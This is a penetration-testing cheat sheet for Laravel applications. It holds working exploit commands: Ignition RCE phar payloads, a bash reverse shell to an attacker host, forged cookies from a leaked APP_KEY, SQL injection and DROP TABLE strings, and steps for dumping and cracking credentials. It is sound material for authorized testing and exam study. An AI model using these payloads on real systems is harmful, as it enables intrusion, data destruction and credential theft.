# Laravel

> PHP Laravel framework reference for penetration testing. Covers detection,
> enumeration, known CVEs, exploitation patterns, misconfigurations, and
> post-exploitation.

---

## Table of Contents

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation Patterns](#4-exploitation-patterns)
- [5. Misconfigurations](#5-misconfigurations)
- [6. Post-Exploitation](#6-post-exploitation)
- [7. OSCP Notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### Response headers / cookies

Laravel sets a distinctive session cookie and CSRF cookie:

```bash
curl -sI http://<TARGET>/ | grep -iE '^(server|set-cookie|x-powered-by)'
```

Expected output:

```text
Set-Cookie: laravel_session=eyJpdiI6...; expires=...; Max-Age=7200; path=/; httponly; samesite=lax
Set-Cookie: XSRF-TOKEN=eyJpdiI6...; expires=...; path=/; samesite=lax
```

Two strong fingerprints:
- `laravel_session` cookie (Laravel default session cookie name)
- `XSRF-TOKEN` cookie (paired with a `X-XSRF-TOKEN` header on state-changing requests)

Both are encrypted and base64-encoded JSON.

### Default error pages

Laravel default error pages:

**Ignition (debug mode, Laravel 6-9):**

```text
Whoops! Looks like something went wrong.

(or)
Ignition - Laravel error page
...
File: /var/www/html/app/Http/Controllers/HomeController.php
Line: 42
...
```

Ignition has "Make editable" and query execution tabs - leaks source and
provides interactive command execution surface (see CVE-2021-3129).

**Standard Laravel error page (non-Ignition):**

```html
<title>Error</title>
...
```

**Production error page:**

```text
Server Error
```

### favicon

Laravel does not ship a default favicon. Not a reliable signal.

### Laravel debug mode

When `APP_DEBUG=true`:

- Full stack trace in response
- `.env` values visible in "Environment" section
- Database query log
- All request/session data
- The `Ignition` interface (Laravel 6+)

This is a critical misconfiguration.

### nmap / whatweb

```bash
nmap -sV -p 80,443,8000,8080 --script http-headers,http-title <TARGET>
whatweb -a 3 http://<TARGET>/
```

Default Laravel dev port: `8000` (`php artisan serve`).

---

## 2. Enumeration

### Standard Laravel paths

```bash
for p in / /api /api/v1 /api/user /login /register /password/reset \
         /admin /dashboard /horizon /telescope /_ignition/health-check \
         /_ignition/execute-solution /storage/ /public/ /.env /artisan; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>$p")
  echo "$code  $p"
done
```

### Debug mode leak (`/_ignition/health-check`)

Laravel 6+ with Ignition (dev/debug):

```bash
curl -s http://<TARGET>/_ignition/health-check
```

Expected output (200):

```json
{"can_execute_commands":true}
```

If `can_execute_commands:true` -> CVE-2021-3129 is exploitable (see section 4).

### Horizon dashboard

Laravel Horizon (queue monitoring) at `/horizon`:

```bash
curl -s http://<TARGET>/horizon | grep -iE 'horizon|laravel'
```

Horizon reveals job details, failed jobs (with payloads), tags.

### Telescope (debug assistant)

Laravel Telescope at `/telescope`:

```bash
curl -s http://<TARGET>/telescope | grep -iE 'telescope'
```

Telescope logs: requests, exceptions, queries, jobs, mails, notifications,
cache, gates, and **auth events** (with passwords on failed logins).

### .env exposure

```bash
curl -s http://<TARGET>/.env
```

Expected output (goldmine):

```text
APP_NAME=Laravel
APP_ENV=production
APP_KEY=base64:...
APP_DEBUG=false
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_DATABASE=laravel
DB_USERNAME=root
DB_PASSWORD=secret
REDIS_HOST=127.0.0.1
MAIL_USERNAME=...
AWS_ACCESS_KEY_ID=...
AWS_SECRET_ACCESS_KEY=...
```

### /storage/ and /public/ directory listing

```bash
curl -s http://<TARGET>/storage/ | grep -i index
curl -s http://<TARGET>/public/ | grep -i index
```

Laravel stores uploaded files in `storage/app/public/` symlinked to
`public/storage/`. If directory listing is on:

```bash
curl -s http://<TARGET>/storage/
curl -s http://<TARGET>/storage/app/public/
```

### Artisan CLI exposure

```bash
curl -s http://<TARGET>/artisan
```

If `artisan` is reachable via web (misconfig), it may leak command output.

### Package versions in composer.json / composer.lock

```bash
for f in composer.json composer.lock package.json package-lock.json yarn.lock; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

`composer.lock` reveals exact package versions -> CVE mapping.

### Backup / dump files

```bash
for f in backup.zip backup.tar.gz dump.sql database.sql .env.bak .env.old \
         storage/backup.zip public/backup.zip; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

### Directory brute force

```bash
feroxbuster -u http://<TARGET>/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,json,txt,env,bak,old,sql
```

### XSRF-TOKEN check

```bash
curl -sI http://<TARGET>/ | grep -i 'xsrf-token'
```

Presence of `XSRF-TOKEN` cookie (base64 of Laravel encrypted token) is a
strong Laravel indicator.

---

## 3. Known CVEs

### CVE-2021-3129 - Ignition RCE (Laravel 6-8)

Ignition (Laravel error page library) allows arbitrary file read and RCE via
`/ _ignition/execute-solution`. Requires `APP_DEBUG=true`.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-3129
Affected: Laravel 6.x, 7.x, 8.x with `facade/ignition` < 2.5.2.

The exploit:
1. Uses phar deserialization + Laravel log file writes.
2. Requires a writable path + ability to read/write log.
3. Chains to `file_get_contents` -> `file_put_contents` -> RCE.

Public exploit:

```bash
git clone https://github.com/ambionics/laravel-exploits.git
# Generate malicious phar
cd laravel-exploits
php -d'phar.readonly=0' ./phpggc/phpggc -p phar Monolog/RCE1 system 'id' > exploit.phar
# Send to target
python3 laravel-ignition-rce.py http://<TARGET>/ exploit.phar
```

### CVE-2018-15133 - APP_KEY deserialization RCE

If `APP_KEY` leaks (via `.env` exposure or debug mode), Laravel's `X-XSRF-TOKEN`
and session cookies become decryptable and forgeable. Then Laravel's
deserialization (via `unserialize` on some older endpoints) -> RCE.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2018-15133
Affected: Laravel 5.6.29 and earlier (and 5.x with vulnerable deserialization endpoints).

Public exploit:

```bash
git clone https://github.com/kozmic/laravel-poc-CVE-2018-15133.git
cd laravel-poc-CVE-2018-15133
php exploit.php --key=<leaked APP_KEY> --url=http://<TARGET>/ --cmd=id
```

### CVE-2020-24940 - SQL injection in `Illuminate\Validation`

NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-24940
Affected: Laravel 6.0.0 - 6.18.34.

### CVE-2023-35887 - PhpSpreadsheet XXE (transitive)

If the app uses PhpSpreadsheet for Excel import (very common in Laravel apps):

NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-35887
Affected: phpoffice/phpspreadsheet < 1.29.0.

XML payload in `.xlsx` -> SSRF / file read / RCE (via `zip://` phar).

### CVE-2024-40075 - Laravel 11 SQL injection

Potential SQL injection via `whereJsonContains` with untrusted keys.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-40075
Affected: Laravel 11 < 11.15.0.

### Version -> CVE quick table

| Version | Type | CVE |
|---------|------|-----|
| 6.x - 8.x (Ignition < 2.5.2) | RCE | CVE-2021-3129 |
| 5.6.29 and earlier | Deser RCE | CVE-2018-15133 |
| 6.0.0 - 6.18.34 | SQLi | CVE-2020-24940 |
| 11 < 11.15.0 | SQLi | CVE-2024-40075 |

---

## 4. Exploitation Patterns

### Ignition RCE (CVE-2021-3129)

Requirements:
- `APP_DEBUG=true`
- `/ _ignition/health-check` returns `{"can_execute_commands":true}`
- Laravel 6-8 with Ignition < 2.5.2

Step 1: verify

```bash
curl -s http://<TARGET>/_ignition/health-check
```

Expected:

```json
{"can_execute_commands":true}
```

Step 2: exploit

```bash
git clone https://github.com/ambionics/laravel-exploits.git
cd laravel-exploits

# Get phpggc (PHP gadget chains)
git clone https://github.com/ambionics/phpggc.git

# Generate phar payload
php -d'phar.readonly=0' phpggc/phpggc -p phar -o /tmp/exploit.phar Monolog/RCE1 system 'id'

# Send
python3 laravel-ignition-rce.py http://<TARGET>/ /tmp/exploit.phar
```

Expected output:

```text
[+] Success: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Reverse shell:

```bash
php -d'phar.readonly=0' phpggc/phpggc -p phar -o /tmp/shell.phar Monolog/RCE1 system 'bash -c "bash -i >& /dev/tcp/<attacker>/4444 0>&1"'
python3 laravel-ignition-rce.py http://<TARGET>/ /tmp/shell.phar
```

### APP_KEY leak -> cookie decryption -> RCE

If `.env` leaks `APP_KEY=base64:...`:

```bash
# Decrypt any Laravel cookie (session, XSRF)
git clone https://github.com/kozmic/laravel-poc-CVE-2018-15133.git
cd laravel-poc-CVE-2018-15133
php decrypt.php --key=base64:<LEAKED_KEY> --cookie='<laravel_session cookie>'
```

Decrypted content (JSON):

```json
{"_token":"...","user_id":1,"login_web_...":1}
```

Forge a session with elevated role:

```bash
php forge.php --key=base64:<LEAKED_KEY> --data='{"user_id":1,"is_admin":true}'
```

Set as `laravel_session` cookie. If the app has a deserialization endpoint
(`CVE-2018-15133`), craft a signed XSRF token to trigger `unserialize`:

```bash
php exploit.php --key=base64:<LEAKED_KEY> --url=http://<TARGET>/ --cmd=id
```

### SQL injection via `whereRaw`

If user input reaches `whereRaw`:

```bash
curl "http://<TARGET>/search?q=test' UNION SELECT 1,2,3-- -"
```

`sqlmap` with `--dbms=mysql`:

```bash
sqlmap -u "http://<TARGET>/search?q=1" --dbms=mysql --level=5 --risk=3
```

### Mass assignment

Old Laravel 4/5 apps without `$fillable` guards accept `is_admin=1`:

```bash
curl -X POST http://<TARGET>/register \
  -d "name=attacker" \
  -d "email=attacker@evil.com" \
  -d "password=pass" \
  -d "is_admin=1"
```

Laravel 5.3+ requires `$fillable` or `$guarded`, so this is only exploitable
in old apps or specific routes.

### Laravel Debugbar

If Debugbar is enabled in production:

```bash
curl -s http://<TARGET>/ -H "X-Requested-With: XMLHttpRequest" -H "X-Debugbar: 1"
```

Or the Debugbar endpoint:

```bash
curl -s "http://<TARGET>/_debugbar/open?op=json"
```

Reveals SQL queries with values (including passwords), config, routes.

### Horizon / Telescope auth bypass

If Horizon / Telescope is exposed without auth (common misconfig), it grants
access to:

- All queued jobs (with payloads, often containing credentials)
- All failed jobs (with stack traces + secrets)
- All HTTP requests (with headers, including `Authorization`)
- All DB queries
- All emails sent

```bash
curl -s http://<TARGET>/horizon/api/jobs/failed | jq .
curl -s http://<TARGET>/telescope/api/requests | jq .
```%%

### Eloquent ORM injection

If the app concatenates user input into `DB::raw()`:

```bash
curl "http://<TARGET>/search?q=test'); DROP TABLE users;--"
```

### Blade template SSTI

If user input reaches `Blade::compileString`:

```bash
curl "http://<TARGET>/page?name=@php system('id'); @endphp"
curl "http://<TARGET>/page?name={{ 7*7 }}"
```

Laravel Blade is sandboxed; only `@php` directives allow code (and only if
the string is compiled with user input).

### Unserialize via cookies / queue

Laravel encrypts cookies and queue payloads with `APP_KEY`. If the key leaks,
craft a signed payload with an unserialize gadget:

```bash
# Using phpggc
phpggc/phpggc Laravel/RCE1 system 'id' -o payload.bin
# Encrypt with leaked APP_KEY (Laravel's Crypt::encrypt format)
php encrypt_payload.php --key=<APP_KEY> --file=payload.bin
```

Then send as cookie or queue job payload.

---

## 5. Misconfigurations

### APP_DEBUG=true in production

```bash
curl -s http://<TARGET>/nonexistent-trigger-error | grep -iE 'Whoops|Ignition|stack trace|vendor/'
```

Triggers:
- Full stack traces with file paths
- `.env` values in the "Environment" tab (Ignition)
- Ignition RCE surface (CVE-2021-3129)

### .env exposed

```bash
curl -s http://<TARGET>/.env
```

Grants `APP_KEY`, DB creds, AWS creds, mail creds, third-party API keys.

### APP_KEY leaked / weak

```bash
curl -s http://<TARGET>/.env | grep -i APP_KEY
```

`APP_KEY` in source, docker image, or `.env` in webroot -> cookie forgery,
deserialization RCE.

### Horizon / Telescope without auth

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://<TARGET>/horizon
curl -s -o /dev/null -w "%{http_code}\n" http://<TARGET>/telescope
```

200 -> misconfigured, exposed to internet.

### Storage directory listing

```bash
curl -s http://<TARGET>/storage/ | grep -iE 'index of|directory'
```

### Backup files in webroot

```bash
for f in backup.zip dump.sql database.sql app.zip .env.bak; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

### `artisan serve` exposed

`Server: PHP/x.y.z Development Server` -> `php artisan serve` running.
Only safe for dev; usually paired with `APP_DEBUG=true`.

### APP_URL misconfigured

```bash
curl -sI http://<TARGET>/ | grep -i location
```

Open redirect / host header poisoning.

### Missing security headers

```bash
curl -sI http://<TARGET>/ | grep -iE 'x-frame-options|content-security-policy|strict-transport'
```

Laravel does not set these by default; they come from middleware.

### Insecure session cookie flags

```bash
curl -sI http://<TARGET>/ | grep -i 'set-cookie.*laravel_session'
```

Check for `Secure`, `HttpOnly`, `SameSite`.

### Default Laravel welcome page

```html
<title>Laravel</title>
...
<div class="title m-b-md">
  Laravel
</div>
```

Confirms default install not customized.

---

## 6. Post-Exploitation

### Config file locations

| Layout | Path |
|--------|------|
| Standard | `<app>/.env`, `<app>/config/*.php` |
| Storage | `<app>/storage/logs/laravel.log` |
| Cache | `<app>/storage/framework/cache/` |
| Sessions | `<app>/storage/framework/sessions/` |
| Views | `<app>/storage/framework/views/` |
| Docker | `/var/www/html/.env`, `/var/www/html/config/` |

### What to look for

```bash
cat /var/www/html/.env
ls -la /var/www/html/config/
cat /var/www/html/config/database.php
cat /var/www/html/config/services.php
grep -rE 'password|secret|key|token' /var/www/html/config/ 2>/dev/null
```

Key items in `.env`:

- `APP_KEY` -> cookie forgery, deserialization
- `DB_PASSWORD` -> DB access
- `AWS_SECRET_ACCESS_KEY` -> cloud pivot
- `MAIL_PASSWORD` -> SMTP
- `STRIPE_SECRET` -> payments
- `PUSHER_APP_SECRET` -> real-time
- `REDIS_PASSWORD` (often empty) -> Redis
- `JWT_SECRET` (if using JWT) -> token forgery

### Database access

From `.env`:

```bash
mysql -h $DB_HOST -u $DB_USERNAME -p$DB_PASSWORD $DB_DATABASE
```

Dump users:

```sql
SELECT id, name, email, password, is_admin FROM users;
SELECT * FROM personal_access_tokens;
```

Laravel password hashes (bcrypt):

```text
$2y$10$<salt><hash>
```

Crack with hashcat mode 3200:

```bash
hashcat -m 3200 laravel_hashes.txt rockyou.txt
```

### Session / cache storage

```bash
ls -la /var/www/html/storage/framework/sessions/
ls -la /var/www/html/storage/framework/cache/
ls -la /var/www/html/storage/logs/
```

Sessions are serialized JSON + HMAC signed. Decode:

```bash
php artisan tinker
>>> decrypt(file_get_contents('storage/framework/sessions/xyz'))
```

### Laravel log file

```bash
tail -n 500 /var/www/html/storage/logs/laravel.log
```

Logs include:
- Every exception with full stack trace
- Every failed login attempt (with credentials in payload)
- Query bindings (with values, including passwords on failed insert)
- Custom `Log::info()` calls (often with sensitive data)

### Queue payloads

If Redis / database queue is accessible:

```bash
# Redis
redis-cli -h <redis>
> keys laravel:*
> lrange laravel:queue:default 0 -1
> hgetall laravel:queue:default:notify
```

Payloads contain job class + serialized data (often credentials).

### .git exposure

```bash
curl -s http://<TARGET>/.git/config
git-dumper http://<TARGET>/.git/ ./dump
cd dump && git log --all --oneline
```

Source leak -> hardcoded secrets, `APP_KEY`, routes, debug leftovers.

### Laravel `artisan` (shell access)

```bash
php artisan tinker
php artisan env
php artisan route:list
php artisan migrate:status
php artisan config:show  # Laravel 11+
```

`artisan tinker` = interactive PHP REPL with DB, filesystem, HTTP access.

### Composer / package vulnerabilities

Enumerate packages from `composer.lock`:

```bash
# Locally
composer audit
# Manual
grep '"name"' composer.lock | sort -u
```

Common vulnerable packages:

- `guzzlehttp/guzzle` < 7.4.5 -> CVE-2022-31090 (cookie leak)
- `phpoffice/phpspreadsheet` < 1.29.0 -> CVE-2023-35887 (XXE)
- `symfony/http-kernel` < 5.4.20 -> various
- `monolog/monolog` < 2.9.1 -> CVE-2022-39261 (log injection)

### Horizon / Telescope data

```bash
curl -s http://<TARGET>/horizon/api/jobs/failed
curl -s http://<TARGET>/telescope/api/requests
curl -s http://<TARGET>/telescope/api/exceptions
```

Failed jobs contain full payload + exception + env snapshot.
Telescope requests contain headers (`Authorization`, cookies).

---

## 7. OSCP Notes

> [!IMPORTANT]
> OSCP report: screenshot the `laravel_session` AND `XSRF-TOKEN` cookies - together they identify Laravel.

> [!IMPORTANT]
> OSCP report: for Ignition RCE (CVE-2021-3129), screenshot the `/_ignition/health-check` response AND the executed command output.

> [!IMPORTANT]
> OSCP report: for `.env` exposure, screenshot the file content AND at least one working credential use (DB login or cookie forgery).

---

## 8. References

- Laravel official docs - https://laravel.com/docs
- NVD search - https://nvd.nist.gov/vuln/search/results?query=laravel
- Ignition RCE writeup - https://www.ambionics.io/blog/laravel-debug-rce
- CVE-2018-15133 writeup - https://github.com/kozmic/laravel-poc-CVE-2018-15133
- Ambionics laravel-exploits - https://github.com/ambionics/laravel-exploits
- phpggc (PHP gadget chains) - https://github.com/ambionics/phpggc
- HackTricks - Laravel - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/laravel

---

*Reference for authorized penetration testing, CTF, and OSCP exam preparation only.*
